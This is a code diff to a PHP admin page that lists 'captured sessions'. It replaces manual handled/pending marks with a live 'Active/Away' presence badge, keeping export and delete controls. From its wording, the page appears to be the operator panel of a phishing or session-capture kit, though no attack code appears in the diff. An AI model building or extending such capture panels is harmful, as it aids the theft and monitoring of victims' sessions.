@@ -89,14 +89,8 @@ if ($loggedIn && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']
     $sessionId = $_POST['session_id'] ?? '';
     $store = h4z3_load_session_store();
 
-    if (isset($store['sessions'][$sessionId])) {
-        if ($action === 'mark_handled') {
-            $store['sessions'][$sessionId]['handled'] = true;
-        } elseif ($action === 'mark_unhandled') {
-            $store['sessions'][$sessionId]['handled'] = false;
-        } elseif ($action === 'delete') {
-            unset($store['sessions'][$sessionId]);
-        }
+    if ($action === 'delete' && isset($store['sessions'][$sessionId])) {
+        unset($store['sessions'][$sessionId]);
         h4z3_write_session_store($store);
     }
 
@@ -125,8 +119,8 @@ uksort($sessions, function ($a, $b) use ($sessions) {
         .session-card { background:#fff; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); margin-bottom:1.5rem; padding:1.5rem; }
         .session-meta { display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; flex-wrap:wrap; }
         .badge { padding:0.25rem 0.75rem; border-radius:999px; font-size:0.75rem; text-transform:uppercase; }
-        .badge.handled { background:#d1fae5; color:#047857; }
-        .badge.pending { background:#fee2e2; color:#b91c1c; }
+        .badge.active { background:#d1fae5; color:#047857; }
+        .badge.away { background:#e2e8f0; color:#1e293b; }
         table { width:100%; border-collapse:collapse; margin-top:1rem; }
         th, td { text-align:left; padding:0.5rem; border-bottom:1px solid #e2e8f0; vertical-align:top; }
         th { background:#e2e8f0; }
@@ -153,23 +147,34 @@ uksort($sessions, function ($a, $b) use ($sessions) {
     <?php if (empty($sessions)): ?>
         <div class="empty-state">No captured sessions available.</div>
     <?php else: ?>
+        <?php
+        $presenceTimeout = 60; // seconds
+        $currentTime = time();
+        ?>
         <?php foreach ($sessions as $sessionId => $sessionData): ?>
+            <?php
+                $lastSeenRaw = $sessionData['last_seen'] ?? null;
+                $lastSeenTimestamp = $lastSeenRaw ? strtotime($lastSeenRaw) : false;
+                if ($lastSeenTimestamp === false) {
+                    $lastSeenTimestamp = null;
+                }
+                $isActive = $lastSeenTimestamp !== null && ($currentTime - $lastSeenTimestamp) <= $presenceTimeout;
+                $badgeClass = $isActive ? 'active' : 'away';
+                $badgeLabel = $isActive ? 'Active' : 'Away';
+                $lastSeenDisplay = $lastSeenRaw ?? 'N/A';
+            ?>
             <div class="session-card">
                 <div class="session-meta">
                     <div>
                         <strong>Session:</strong> <?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?><br>
-                        <small>Last updated: <?php echo htmlspecialchars($sessionData['last_updated'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></small>
+                        <small>Last updated: <?php echo htmlspecialchars($sessionData['last_updated'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></small><br>
+                        <small>Last seen: <?php echo htmlspecialchars($lastSeenDisplay, ENT_QUOTES, 'UTF-8'); ?></small>
                     </div>
-                    <div class="badge <?php echo !empty($sessionData['handled']) ? 'handled' : 'pending'; ?>">
-                        <?php echo !empty($sessionData['handled']) ? 'Handled' : 'Pending'; ?>
+                    <div class="badge <?php echo $badgeClass; ?>">
+                        <?php echo $badgeLabel; ?>
                     </div>
                 </div>
                 <div class="actions">
-                    <form method="post" action="">
-                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
-                        <input type="hidden" name="action" value="<?php echo !empty($sessionData['handled']) ? 'mark_unhandled' : 'mark_handled'; ?>">
-                        <button type="submit" class="action-btn secondary"><?php echo !empty($sessionData['handled']) ? 'Mark Pending' : 'Mark Handled'; ?></button>
-                    </form>
                     <a class="export-link" href="?export=<?php echo urlencode($sessionId); ?>">Export</a>
                     <form method="post" action="" onsubmit="return confirm('Delete this session?');">
                         <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
